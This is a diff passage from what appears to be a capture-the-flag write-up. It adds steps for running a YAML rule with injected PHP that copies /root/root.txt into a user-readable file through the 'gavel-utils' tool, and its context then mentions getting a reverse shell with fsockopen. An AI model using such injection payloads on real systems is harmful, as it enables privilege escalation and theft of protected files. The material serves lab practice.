@@ -192,6 +192,14 @@ rule_msg: root flag
 rule: file_put_contents('/home/auctioneer/readme.txt', file_get_contents('/root/root.txt'), );return false;
 ```
 
+Save the previous code to a YAML file. Make sure you create the file `readme.txt` before executing `gavel-utils`, so PHP does not create it with root privileges making it unreadable for others.
+
+```sh
+touch ~/readme.txt
+gavel-utils submit get_flag.yaml
+cat ~/readme.txt
+```
+
 A reverse shell can be also obtained with the `fsockopen` function.
 ```yaml
 name: revsh
